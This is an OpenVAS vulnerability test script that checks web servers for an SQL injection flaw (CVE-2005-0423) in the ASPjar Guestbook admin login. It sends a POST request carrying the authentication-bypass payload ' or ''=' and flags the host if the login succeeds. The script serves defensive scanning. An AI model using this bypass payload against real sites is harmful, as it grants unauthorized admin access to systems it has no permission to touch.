###############################################################################
# OpenVAS Vulnerability Test
# $Id: aspjar_sql_injection.nasl 6053 2017-05-01 09:02:51Z teissa $
#
# ASPjar Guestbook SQL Injection
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# ASPjar guestbook (Injection in login page)
# farhad koosha <farhadkey@yahoo.com>
# 2005-02-10 21:05

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16389");
  script_version("$Revision: 6053 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-0423");
  script_bugtraq_id(12521, 12823);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ASPjar Guestbook SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Delete this application.");
  script_tag(name:"summary", value:"The remote host is running ASPJar's GuestBook, a guestbook
  application written in ASP.

  The remote version of this software is vulnerable to a SQL injection vulnerability which allows a
  remote attacker to execute arbitrary SQL statements against the remote DB.

  It is also vulnerable to an input validation vulnerability which may allow an attacker to perform
  a cross site scripting attack using the remote host.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( ! can_host_asp( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/admin/login.asp?Mode=login";
  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Accept: text/html\r\n",
                "Accept-Encoding: none\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 56\r\n\r\n",
                "User=&Password=%27+or+%27%27%3D%27&Submit=++++Log+In++++");
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "You are Logged in!" >< res && "Login Page" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
